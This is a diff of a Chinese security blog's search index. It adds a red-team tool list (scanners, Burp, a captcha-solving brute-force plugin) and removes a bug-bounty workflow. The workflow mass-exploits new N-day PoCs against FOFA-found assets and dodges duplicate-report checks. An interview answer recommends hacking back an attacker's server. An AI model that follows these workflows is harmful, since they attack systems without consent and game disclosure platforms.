class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">//获取SB容器（这里是根据JavaConfig这个类创建出来的容器）</span></span><br><span class="line">        <span class="type">AnnotationConfigApplicationContext</span> <span class="variable">ioc</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AnnotationConfigApplicationContext</span>(JavaConfig.class);</span><br><span class="line">        <span class="comment">//获取容器中的一个Bean</span></span><br><span class="line">        <span class="type">UserService</span> <span class="variable">us</span> <span class="operator">=</span> ioc.getBean(UserServiceImpl.class);</span><br><span class="line">        us.getUser();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">程序输出：UserDao2</span></span><br><span class="line"><span class="comment">Start ==&gt; ioc ==&gt; JavaConfig.class ==&gt; top.shaoxinsec.springstudy ==&gt; UserServiceImpl(IOC/DI之后) ==&gt; getUser()</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
+</ol>
+]]></content>
+      <categories>
+        <category>开发</category>
+      </categories>
+      <tags>
+        <tag>Java</tag>
+        <tag>后端</tag>
+        <tag>SpringBoot</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>红队工具</title>
+    <url>/RedTeamTools.html</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><meta name="referrer" content="no-referrer"/>
+
+<h1 id="工具统计"><a href="#工具统计" class="headerlink" title="工具统计"></a>工具统计</h1><h2 id="Vulnerability-Scan"><a href="#Vulnerability-Scan" class="headerlink" title="Vulnerability Scan"></a>Vulnerability Scan</h2><table>
+<thead>
+<tr>
+<th>Tool</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>nuclei</td>
+<td>基于yaml格式的POC漏扫工具（命令行形式）</td>
+</tr>
+<tr>
+<td>nuclei-web</td>
+<td>少欣自研的基于nuclei+fofa的漏扫平台</td>
+</tr>
+<tr>
+<td>AWVS</td>
+<td>国外的漏扫平台，建议在闲鱼上购买当年最新的版本</td>
+</tr>
+</tbody></table>
+<h2 id="Package-Sniffing"><a href="#Package-Sniffing" class="headerlink" title="Package Sniffing"></a>Package Sniffing</h2><table>
+<thead>
+<tr>
+<th>Tool</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>BurpSuite</td>
+<td>经典HTTP&#x2F;s抓包工具，插件生态丰富</td>
+</tr>
+<tr>
+<td>Wireshark</td>
+<td>抓去整个网卡流量的老牌工具</td>
+</tr>
+<tr>
+<td>Proxifier</td>
+<td>代理指定进程的所有流量</td>
+</tr>
+<tr>
+<td>Yakit</td>
+<td>国产http&#x2F;s抓包工具，新起之秀，等几年插件生态丰富了再用</td>
+</tr>
+<tr>
+<td>captcha-killer</td>
+<td>BurpSuite插件：爆破登录框时，自动识别验证码</td>
+</tr>
+<tr>
+<td>HaE</td>
+<td>根据正则表达式在请求或者响应中匹配关键字，然后高亮显示，检测信息泄露非常好用</td>
+</tr>
+</tbody></table>
+<h2 id="Reverse-Engineering"><a href="#Reverse-Engineering" class="headerlink" title="Reverse Engineering"></a>Reverse Engineering</h2><table>
+<thead>
+<tr>
+<th>Tool</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>010Editor</td>
+<td>16进制查看工具</td>
+</tr>
+<tr>
+<td>jadx-gui</td>
+<td>apk&#x2F;jar静态分析、反编译工具</td>
+</tr>
+</tbody></table>
+<h2 id="All-in"><a href="#All-in" class="headerlink" title="All-in"></a>All-in</h2><table>
+<thead>
+<tr>
+<th>Tool</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Tscan</td>
+<td>聚合了端口扫描、poc扫描、红队常用小工具的GUI程序，基于JAVA实现跨平台</td>
+</tr>
+</tbody></table>
+<h2 id="ObtainInfo"><a href="#ObtainInfo" class="headerlink" title="ObtainInfo"></a>ObtainInfo</h2><table>
+<thead>
+<tr>
+<th>Tool</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>observer_ward</td>
+<td>Web finger scanner</td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+</tr>
+</tbody></table>
+<h1 id="踩坑"><a href="#踩坑" class="headerlink" title="踩坑"></a>踩坑</h1><h2 id="xray"><a href="#xray" class="headerlink" title="xray"></a>xray</h2><ol>
+<li><p>windows平台上，双击启动或者通过自己写的bat&#x2F;vbs启动器运行xray.exe，会出下下面的报错（no command provided）。</p>
+<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20251111101623009.png" alt="image-20251111101623009"></p>
+</li>
+<li><p>解决方法</p>
+ <figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">1. 手工打开CMD，然后进入到xray.exe所在的目录，再执行xray相关命令（推荐）</span><br><span class="line">2. 如果说你每次打开CMD，都在XX目录，那么将xray所在的目录中的所有文件全部放到XX目录中（注意，是所有内容，而不是整个文件夹），最终将XX目录添加到系统环境变量中即可（不推荐）</span><br></pre></td></tr></table></figure></li>
+</ol>
+]]></content>
+      <categories>
+        <category>红队</category>
+      </categories>
+      <tags>
+        <tag>武器库</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>红队面试</title>
     <url>/%E5%85%AB%E8%82%A1%E6%96%87.html</url>
     <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><meta name="referrer" content="no-referrer"/>
 
@@ -586,29 +820,13 @@
  <figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">1. 确认攻击事件之后，通过系统日志、网络流量定位到攻击者ip；</span><br><span class="line">2. 通过一些在线网站ip138、站长之家反查域名，尽量找到攻击者的个人信息；</span><br><span class="line">3. 反打攻击者ip，找到vps上遗留的个人数据，查看登录日志，找出上一次的登录ip；</span><br><span class="line">4. 部署蜜罐，套取攻击者的工具信息、字典信息、攻击的目标等攻击手法</span><br></pre></td></tr></table></figure></li>
 </ol>
 ]]></content>
-  </entry>
-  <entry>
-    <title>SRC挖掘</title>
-    <url>/SRC%E6%8C%96%E6%8E%98.html</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><meta name="referrer" content="no-referrer"/>
-
-<h2 id="资产测绘"><a href="#资产测绘" class="headerlink" title="资产测绘"></a>资产测绘</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">url: fofa.icu  fofa.info</span><br><span class="line">query: country=&quot;CN&quot; &amp;&amp; (host=&quot;.com&quot; || host=&quot;.cn&quot;) &amp;&amp; </span><br></pre></td></tr></table></figure>
-
-<h2 id="企业背调"><a href="#企业背调" class="headerlink" title="企业背调"></a>企业背调</h2><ol>
-<li>企查查：<a href="https://www.qcc.com/">https://www.qcc.com/</a></li>
-<li>爱企查：<a href="https://aiqicha.baidu.com/">https://aiqicha.baidu.com/</a></li>
-<li>SEO权重：<a href="https://github.com/Potato-py/ipInfoSearch">https://github.com/Potato-py/ipInfoSearch</a></li>
-</ol>
-<h2 id="SRC平台"><a href="#SRC平台" class="headerlink" title="SRC平台"></a>SRC平台</h2><ol>
-<li>权重为0：漏洞盒子-公益SRC</li>
-<li>有权重：补天</li>
-<li>edu.cn：教育SRC</li>
-<li>大厂：专属SRC</li>
-</ol>
-<h2 id="快速出洞"><a href="#快速出洞" class="headerlink" title="快速出洞"></a>快速出洞</h2><h3 id="通过Nday找目标"><a href="#通过Nday找目标" class="headerlink" title="通过Nday找目标"></a>通过Nday找目标</h3><p>在nuclei poc的收集平台上<a href="https://github.com/adysec/nuclei_poc%E4%BB%A5%E6%97%B6%E9%97%B4%E9%A1%BA%E5%BA%8F%E5%80%92%E6%8E%A8%E6%89%BE%E6%9C%80%E6%96%B0%E7%9A%84poc">https://github.com/adysec/nuclei_poc以时间顺序倒推找最新的poc</a>  &#x3D;&#x3D;&gt;  然后通过FOFA匹配资产  &#x3D;&#x3D;&gt;  VPS批量漏洞+云端上传  &#x3D;&#x3D;&gt;  导出结果+ipinfoSearch批量查权重  &#x3D;&#x3D;&gt;  企查查&#x2F;爱企查做背调  &#x3D;&#x3D;&gt;  有权重交补天，没权重交盒子  &#x3D;&#x3D;&gt;  如果提示漏洞标题存在，加上一些特殊符号进行绕过。</p>
-<ol>
-<li>URL格式处理：<a href="http://tools.sbbbb.cn/url-ip/">URL &amp; IP 在线处理工具</a></li>
-</ol>
-]]></content>
+      <categories>
+        <category>红队</category>
+      </categories>
+      <tags>
+        <tag>面试</tag>
+        <tag>八股文</tag>
+        <tag>面经</tag>
+      </tags>
   </entry>
 </search>
